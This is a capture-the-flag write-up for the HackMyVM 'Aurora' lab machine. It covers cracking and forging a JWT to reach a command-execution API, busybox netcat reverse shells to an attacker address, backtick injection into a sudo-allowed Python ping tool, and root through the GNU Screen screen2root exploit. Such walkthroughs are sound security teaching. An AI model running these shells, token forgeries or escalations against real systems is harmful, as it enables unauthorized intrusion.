# Aurora

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Aurora | cromiphi | Beginner | HackMyVM |

**Summary:** Aurora is a beginner-level Linux machine on HackMyVM. The attack path begins with network discovery revealing two exposed services: SSH on port 22 and a Node.js Express web application on port 3000. The web application exposes unauthenticated API endpoints including `/register`, `/login`, and `/execute`. Through POST-method fuzzing, valid roles are enumerated and an account is registered. The issued JWT token is then cracked offline using John the Ripper, revealing a weak secret (`nopassword`). With the cracked secret, a forged JWT is crafted with elevated `admin` privileges using a JWT encoder tool (jwt.io). The forged token unlocks a remote command execution endpoint (`/execute`), which accepts a `command` JSON parameter and runs it on the server, granting an initial foothold as `www-data`. From there, a `sudo` misconfiguration allows `www-data` to execute a Python network utility script (`tools.py`) as the user `doro` without a password. The script's `--ping` function uses `os.system()` with insufficient input sanitisation — backtick command substitution bypasses the blacklisted character filter, enabling lateral movement to `doro` via a second reverse shell. Finally, privilege escalation to `root` is achieved by exploiting a SUID-bit-enabled `GNU Screen 4.05.00` binary, vulnerable to the well-known `screen2root` local privilege escalation exploit (CVE-2017-5618).

---

## Reconnaissance

### Network Discovery

The target machine was discovered on the local subnet using a custom PowerShell network scanner, identifying the VirtualBox VM at `192.168.100.130`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.130 08:00:27:D0:FC:EC VirtualBox
```

### Port Scanning

A full-port Nmap scan with service/version detection and default scripts was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ nmap -sC -sV -p- -T4 192.168.100.130
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 11:01 WIB
Nmap scan report for 192.168.100.130
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.86 seconds
```

**Findings:**
- **Port 22** — OpenSSH 8.4p1 on Debian 11. No public vulnerabilities for this version; requires credentials.
- **Port 3000** — Node.js Express web application. The HTTP title `Error` on a GET request to `/` hints the app may only respond to POST requests or specific routes.

---

## Initial Access

### Web Application Enumeration

Noticing that the default GET request returned an error page, the enumeration strategy was adjusted to use the **POST** method. `ffuf` was used to brute-force directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ ffuf -u http://192.168.100.130:3000/FUZZ -X POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -e txt,php,html -mc 200,301,302,400,401,403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.100.130:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Extensions       : txt php html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,400,401,403
________________________________________________

login                   [Status: 401, Size: 22, Words: 2, Lines: 1, Duration: 349ms]
register                [Status: 400, Size: 29, Words: 6, Lines: 1, Duration: 323ms]
Login                   [Status: 401, Size: 22, Words: 2, Lines: 1, Duration: 415ms]
Register                [Status: 400, Size: 29, Words: 6, Lines: 1, Duration: 250ms]
execute                 [Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 107ms]
```

Three API endpoints were discovered: `/register`, `/login`, and `/execute`. Each was probed manually to understand their expected input:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/login
Identifiants invalides

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/register
The "role" field is not valid

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/execute
Unauthorized
```

The `/register` endpoint explicitly requires a `role` field. Attempting to register with `role: admin` was blocked:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/register -H "Content-Type: application/json" -d '{"username": "ouba", "password":"password123", "role":"admin"}'
Not authorized !
```

### Role Enumeration via Fuzzing

The `role` field value was fuzzed using `ffuf` with an API wordlist to discover which values the application accepts:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ ffuf -X POST -u http://192.168.100.130:3000/register -H "Content-Type: application/json" -d '{"username": "ouba", "password":"password123", "role":"FUZZ"}' -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.100.130:3000/register
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username": "ouba", "password":"password123", "role":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 401, Size: 16, Words: 3, Lines: 1, Duration: 54ms]
admin                   [Status: 401, Size: 16, Words: 3, Lines: 1, Duration: 130ms]
user                    [Status: 200, Size: 15, Words: 2, Lines: 1, Duration: 270ms]
:: Progress: [12334/12334] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

The only accepted `role` value for registration is `user`. The fuzzing process itself registered the account (the `user` hit during fuzzing triggered the registration), so attempting to register again returned `Username already exists`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/register -H "Content-Type: application/json" -d '{"username": "ouba", "password":"password123", "role":"user"}'
Username already exists
```

### JWT Authentication and Secret Cracking

Logging in with the registered credentials returned a JWT token:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/login -H "Content-Type: application/json" -d '{"username": "ouba", "password":"password123", "role":"user"}'
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im91YmEiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3MjA4NDk5OX0.2dB4ZjsL2kLJL-mMnFmTe76leRusou_gWPQ6vQURJQk"}
```

The JWT uses the `HS256` algorithm (symmetric HMAC), making it possible to crack the signing secret offline. The token was saved and fed to **John the Ripper**:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im91YmEiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3MjA4NDk5OX0.2dB4ZjsL2kLJL-mMnFmTe76leRusou_gWPQ6vQURJQk' > jwt.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)
1g 0:00:00:00 DONE (2026-02-26 12:56) 20.00g/s 327680p/s 327680c/s 327680C/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The JWT signing secret is **`nopassword`**.

### JWT Forgery — Privilege Escalation to Admin Role

With the signing secret known, a new JWT was crafted with `username: admin` and `role: admin` using [jwt.io](https://jwt.io). The image below shows the forged token being generated with the secret `nopassword`:

![](image.png)

The forged token is:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyMDg0OTk5fQ.GXnyTqA9mKLismhhIFxC2uZx3220u9BB28zgnmE9XZQ
```

The payload decoded is:
```json
{
  "username": "admin",
  "role": "admin",
  "iat": 1772084999
}
```

### Remote Code Execution via `/execute`

The forged admin token was used to access the `/execute` endpoint. An initial attempt with `cmd` parameter returned a verbose Node.js stack trace leaking the application path (`/opt/login-app/app.js`):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/execute -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyMDg0OTk5fQ.GXnyTqA9mKLismhhIFxC2uZx3220u9BB28zgnmE9XZQ" -H "Content-Type: application/json" -d ' {"cmd":"id"}'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The &quot;file&quot; argument must be of type string. Received undefined<br> &nbsp; &nbsp;at validateString (internal/validators.js:120:11)<br> &nbsp; &nbsp;at normalizeSpawnArguments (child_process.js:411:3)<br> &nbsp; &nbsp;at spawn (child_process.js:547:16)<br> &nbsp; &nbsp;at Object.execFile (child_process.js:237:17)<br> &nbsp; &nbsp;at exec (child_process.js:158:25)<br> &nbsp; &nbsp;at /opt/login-app/app.js:69:3<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at /opt/login-app/app.js:112:5<br> &nbsp; &nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12</pre>
</body>
</html>
```

The stack trace reveals the application expects a `file` argument — indicating the correct parameter name is likely `command`. Retrying with `command`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/execute -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyMDg0OTk5fQ.GXnyTqA9mKLismhhIFxC2uZx3220u9BB28zgnmE9XZQ" -H "Content-Type: application/json" -d '{"command":"id"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmed unauthenticated remote code execution as `www-data`.

### Reverse Shell — `www-data`

A netcat listener was set up, then the RCE endpoint was used to trigger a `busybox` reverse shell:

**Listener:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Trigger:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ curl -X POST http://192.168.100.130:3000/execute -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyMDg0OTk5fQ.GXnyTqA9mKLismhhIFxC2uZx3220u9BB28zgnmE9XZQ" -H "Content-Type: application/json" -d '{"command":"busybox nc 192.168.100.1 4444 -e /bin/bash"}'
```

**Shell received and upgraded to a fully interactive TTY:**
```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58915
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@aurora:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@aurora:~$ export SHELL=bash
www-data@aurora:~$ export TERM=xterm
www-data@aurora:~$ stty rows 75 cols 100
```

---

## Internal Enumeration

### User and Directory Enumeration

```bash
www-data@aurora:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
doro:x:1000:1000:,,,:/home/doro:/bin/bash
www-data@aurora:~$ ls -la /home/doro/
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt
```

There is one non-root user `doro`. The `user.txt` flag is not readable by `www-data`. There is a `tools.py` script in `doro`'s home directory, readable by all but only executable by `doro`.

### Web Application Working Directory

```bash
www-data@aurora:~$ ls -la
total 124
drwxr-xr-x   3 www-data www-data  4096 Apr  6  2023 .
drwxr-xr-x   3 root     root      4096 Mar  1  2023 ..
-rw-r--r--   1 www-data www-data  3271 Mar  1  2023 app.js
-rw-r--r--   1 www-data www-data  3169 Mar  2  2023 app.js.save
-rw-------   1 www-data www-data   153 Apr  6  2023 .bash_history
drwxr-xr-x 127 www-data www-data  4096 Mar  1  2023 node_modules
-rw-r--r--   1 www-data www-data   399 Mar  1  2023 package.json
-rw-r--r--   1 www-data www-data 95944 Mar  1  2023 package-lock.json
```

### Sudo Privileges

```bash
www-data@aurora:~$ which sudo
/usr/bin/sudo
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
```

`www-data` can run `tools.py` as `doro` without a password. The wildcard `*` means arguments are allowed.

### Analysing `tools.py`

```bash
www-data@aurora:~$ cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) < 2:
        print_help()
        return

    option = sys.argv[1]
    if option == "--ping":
        ping()
    elif option == "--traceroute":
        traceroute_ip()
    else:
        print("Invalid option.")
        print_help()

def print_help():
    print("Usage: python3 network_tool.py <option>")
    print("Options:")
    print("--ping           Ping an IP address")
    print("--traceroute     Perform a traceroute on an IP address")

def ping():
    ip_address = input("Enter an IP address: ")

    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
    for char in forbidden_chars:
        if char in ip_address:
            print("Forbidden character found: {}".format(char))
            sys.exit(1)

    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input("Enter an IP address: ")

    if not is_valid_ip(ip_address):
        print("Invalid IP address.")
        return

    traceroute_command = "traceroute {}".format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
            return False
    return True

if __name__ == "__main__":
    main()
```

**Vulnerability Analysis:**

- **`--traceroute`**: Validates the IP strictly using `is_valid_ip()` — only accepts proper IPv4, blocking injection.
- **`--ping`**: Uses a denylist of forbidden characters: `& ; ( ) || | > < * ?`. However, **backticks (`` ` ``)** are missing from the blacklist. Backtick command substitution is honoured by `os.system()` which calls `/bin/sh -c`, making injection trivially possible.

---

## Privilege Escalation

### Step 1: Lateral Movement to `doro` via Backtick Injection

Initial tests confirmed the injection vector:

```bash
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --traceroute
Enter an IP address: ${id}
Invalid IP address.
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --traceroute
Enter an IP address: `id`
Invalid IP address.
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `id`
ping: groups=1000(doro): Name or service not known
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `/bin/bash`
```

The `id` output confirmed execution as `doro`. The `/bin/bash` attempt resulted in a ghost shell (no interactive TTY), so a second reverse shell was triggered instead.

**Listener:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
```

**Trigger via backtick injection:**
```bash
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `busybox nc 192.168.100.1 8888 -e /bin/bash`
```

**Shell received and upgraded:**
```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59240
id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
python3 -c 'import pty; pty.spawn("/bin/bash")'
doro@aurora:/opt/login-app$ ^Z
zsh: suspended  nc -lnvp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/aurora]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 8888

doro@aurora:/opt/login-app$ export SHELL=bash
doro@aurora:/opt/login-app$ export TERM=xterm
doro@aurora:/opt/login-app$ stty rows 59 cols 100
```

### Step 2: SUID Enumeration — GNU Screen 4.05.00

```bash
doro@aurora:/opt/login-app$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-- 1 root messagebus 51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-sr-x+ 1 root root 1785104 Mar  3  2023 /usr/bin/screen
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
doro@aurora:/opt/login-app$ /usr/bin/screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

`/usr/bin/screen` is SUID root and the version is **4.05.00 (10-Dec-16)**, which is vulnerable to the `screen2root` local privilege escalation exploit — a well-known vulnerability that abuses the SUID bit combined with `ld.so.preload` manipulation to execute arbitrary code as root. PoC: [https://github.com/XiphosResearch/exploits/tree/master/screen2root](https://github.com/XiphosResearch/exploits/tree/master/screen2root)

### Step 3: Root via `screen2root` Exploit (CVE-2017-5618)

The `screenroot.sh` exploit script was written and executed from `doro`'s home directory:

```bash
doro@aurora:~$ nano screenroot.sh
doro@aurora:~$ chmod +x screenroot.sh
doro@aurora:~$ ./screenroot.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function 'execvp' expecting 2 [-Wbuiltin-declaration-mismatch]
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
uid=0(root) gid=0(root) groups=0(root),1000(doro)
# su - root
root@aurora:~# id
uid=0(root) gid=0(root) groups=0(root)
root@aurora:~# hostname
aurora.hmv
root@aurora:~# whoami
root
```

### Flags

```bash
root@aurora:~# cat /home/doro/user.txt /root/root.txt
ccd[REDACTED]
052[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan revealed two services — SSH on port 22 and a Node.js Express API on port 3000. The API returns errors on GET requests, indicating POST-only endpoints.
2. **Vulnerability Discovery**: POST-based directory fuzzing with `ffuf` uncovered three API endpoints: `/register`, `/login`, and `/execute`. Role enumeration via fuzzing the `role` JSON parameter identified `user` as the only self-registerable role, while `admin` returns `401 Not authorized`.
3. **Exploitation — JWT Forgery**: A user account was registered and a JWT token obtained. The HS256 signing secret was cracked offline using John the Ripper (`nopassword`). A new token was forged using jwt.io with `username: admin` and `role: admin`, signed with the cracked secret. The forged token unlocked the `/execute` endpoint, confirming RCE as `www-data` via the `command` JSON parameter. A `busybox` reverse shell established the initial foothold.
4. **Internal Enumeration**: `sudo -l` revealed that `www-data` can execute `/usr/bin/python3 /home/doro/tools.py *` as `doro` without a password. Source code review of `tools.py` identified that the `--ping` function uses `os.system()` with an incomplete character blacklist — backtick command substitution (`` ` ``) is not blocked.
5. **Lateral Movement to `doro`**: Backtick injection in the `--ping` IP address prompt executed an arbitrary command as `doro`. A second `busybox` reverse shell established a foothold as `doro`.
6. **Privilege Escalation to `root`**: SUID binary enumeration identified `/usr/bin/screen` version 4.05.00, vulnerable to CVE-2017-5618 (`screen2root`). The exploit compiled a malicious shared library, injected it via `/etc/ld.so.preload` using screen's SUID privileges, and spawned a root shell.
